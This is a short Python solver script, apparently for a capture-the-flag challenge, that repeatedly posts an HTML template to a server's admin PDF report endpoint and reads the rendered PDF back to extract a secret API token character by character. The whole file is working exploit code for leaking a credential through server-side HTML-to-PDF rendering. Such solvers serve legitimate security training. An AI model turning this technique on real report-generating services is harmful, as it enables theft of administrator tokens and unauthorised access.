#!/usr/bin/env python3
import os
import sys
import requests
import pdftotext

url = 'https://api.wimc.ctf.allesctf.net/1.0/admin/createReport'

headers = {
	'X-API-TOKEN': ''
}

with open('stage2.html', 'r') as f:
	template = f.read()

# r = requests.post(url, headers=headers, data={"html": f.read()})

token = ''

while len(token) < 30:
	payload = template.replace('__TOKEN__', token)
	r = requests.post(url, headers=headers, data={"html": payload})
	if len(r.text) < 100:
		print(r.text, file=sys.stderr)
		exit(1)

	result = open('result.pdf', 'wb')
	result.write(b''.join(r.iter_content()))
	result.close()

	result = open('result.pdf', 'rb')
	pdf = pdftotext.PDF(result)
	result.close()

	token = pdf[0].split('\n')[0]

os.remove('result.pdf')
print(f'Got token: {token}')
